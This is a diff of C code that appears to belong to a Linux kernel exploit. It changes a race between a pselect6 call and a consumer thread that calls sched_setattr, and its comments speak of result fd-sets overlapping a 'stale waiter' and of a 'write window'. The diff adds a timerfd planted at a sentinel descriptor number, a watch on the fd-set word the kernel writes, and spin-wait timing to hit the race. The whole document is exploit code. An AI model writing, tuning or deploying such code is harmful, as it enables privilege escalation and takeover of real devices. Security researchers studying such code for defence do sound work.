@@ -21,6 +21,11 @@
 #if SLIDE_PSELECT_RESULT_ROUTE && SLIDE_PSELECT_WORD_SHIFT != 1
 #error "SLIDE_PSELECT_RESULT_ROUTE requires word shift 1"
 #endif
+#if SLIDE_PSELECT_RESULT_ROUTE
+#ifndef SLIDE_PSELECT_RESULT_SENTINEL_FD
+#define SLIDE_PSELECT_RESULT_SENTINEL_FD 63
+#endif
+#endif
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
@@ -54,6 +59,10 @@ static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_pselect_write_window;
+#if SLIDE_PSELECT_RESULT_ROUTE
+static atomic_uintptr_t slide_result_watch_word;
+static atomic_uint_fast64_t slide_result_watch_mask;
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static atomic_uint_fast64_t slide_pselect_started_ns;
 static int slide_pselect_production_stack;
@@ -383,7 +392,50 @@ void slide_pselect_stack_copy(void) {
     }
   }
 #endif
+#if SLIDE_PSELECT_RESULT_ROUTE
+  int sentinel_fd = SLIDE_PSELECT_RESULT_SENTINEL_FD;
+  if (sentinel_fd < 0 || sentinel_fd >= slide_pselect_nfds ||
+      FD_ISSET(sentinel_fd, &expected_in) ||
+      FD_ISSET(sentinel_fd, &expected_out) ||
+      FD_ISSET(sentinel_fd, &expected_ex)) {
+    pr_error("slide result-route invalid sentinel fd=%d nfds=%d\n",
+             sentinel_fd, slide_pselect_nfds);
+    close(high_read);
+    close(block_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+  int sentinel_source =
+      (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (sentinel_source < 0) {
+    pr_error("slide result-route sentinel timerfd errno=%d\n", errno);
+    close(high_read);
+    close(block_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+  if (dup2(sentinel_source, sentinel_fd) < 0) {
+    pr_error("slide result-route sentinel dup2 errno=%d fd=%d\n",
+             errno, sentinel_fd);
+    close(sentinel_source);
+    close(high_read);
+    close(block_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    return;
+  }
+#endif
   open_slide_selected_fds(&in, &out, &ex, high_read);
+#if SLIDE_PSELECT_RESULT_ROUTE
+  FD_SET(sentinel_fd, &in);
+  atomic_store(&slide_result_watch_word,
+               (uintptr_t)((unsigned long *)&in +
+                           sentinel_fd / (8 * sizeof(unsigned long))));
+  atomic_store(&slide_result_watch_mask,
+               1ULL << (sentinel_fd % (8 * sizeof(unsigned long))));
+#endif
 
   atomic_store(&slide_consume_stop, 0);
   atomic_store(&slide_consume_go, 0);
@@ -417,32 +469,18 @@ void slide_pselect_stack_copy(void) {
   for (int index = 0; index < slide_syscall_pad; index++) {
     syscall(SYS_gettid);
   }
-#if !SLIDE_PSELECT_RESULT_ROUTE
   atomic_store(&slide_consume_go, 1);
-#endif
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
   int saved_errno = errno;
+  atomic_store(&slide_consume_go, 0);
 #if SLIDE_PSELECT_RESULT_ROUTE
   int result_ready =
       ret > 0 && memcmp(&in, &expected_in, sizeof(in)) == 0 &&
       memcmp(&out, &expected_out, sizeof(out)) == 0 &&
       memcmp(&ex, &expected_ex, sizeof(ex)) == 0;
-  if (result_ready) {
-    /*
-     * core_sys_select has already materialized the selected descriptor masks
-     * in its result fd-sets. On legacy targets those result words overlap
-     * the stale waiter. Do not enter the kernel again on this thread before
-     * the consumer has issued sched_setattr against it.
-     */
-    atomic_store(&slide_consume_go, 1);
-    for (size_t spins = 0;
-         !atomic_load(&slide_consume_stop) && spins < 100000000ULL;
-         spins++) {
-      __asm__ volatile("yield" ::: "memory");
-    }
-  } else {
+  if (!result_ready) {
     pr_error("slide result-route fd-set mismatch ret=%d errno=%d\n",
              ret, saved_errno);
     atomic_store(&slide_consume_stop, 1);
@@ -450,7 +488,6 @@ void slide_pselect_stack_copy(void) {
 #endif
   size_t pselect_elapsed_usec =
       (gettime_ns() - pselect_started) / 1000ULL;
-  atomic_store(&slide_consume_go, 0);
 
   if (atomic_load(&slide_consume_enter_sched) != 0 &&
       !atomic_load(&slide_consume_stop)) {
@@ -495,6 +532,10 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_pselect_write_window,
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
 
+#if SLIDE_PSELECT_RESULT_ROUTE
+  close(sentinel_fd);
+  if (sentinel_source != sentinel_fd) close(sentinel_source);
+#endif
   close(high_read);
   if (block_fd != pipefd[0]) {
     close(block_fd);
@@ -602,6 +643,26 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 
     seen = seq;
     atomic_store(&slide_consume_seen, seen);
+#if SLIDE_PSELECT_RESULT_ROUTE
+    uintptr_t watch_word = atomic_load(&slide_result_watch_word);
+    uint64_t watch_mask = atomic_load(&slide_result_watch_mask);
+    if (!watch_word || !watch_mask) {
+      atomic_store(&slide_consume_stop, 1);
+      return NULL;
+    }
+    while ((__atomic_load_n((const unsigned long *)watch_word,
+                            __ATOMIC_ACQUIRE) & watch_mask) != 0) {
+      if (atomic_load(&slide_consume_stop) ||
+          atomic_load(&slide_consume_go) != seq) {
+        return NULL;
+      }
+      __asm__ volatile("yield" ::: "memory");
+    }
+    if (atomic_load(&slide_consume_go) != seq) {
+      return NULL;
+    }
+    int tid = atomic_load(&slide_waiter_tid);
+#else
     if (atomic_load(&slide_consume_go) != seq) {
       int lost = atomic_load(&slide_consume_lost) + 1;
       atomic_store(&slide_consume_lost, lost);
@@ -683,6 +744,7 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       usleep(slide_enter_delay_usec());
     }
     int tid = atomic_load(&slide_waiter_tid);
+#endif
 #endif
 
     int calls = atomic_load(&slide_consume_calls);
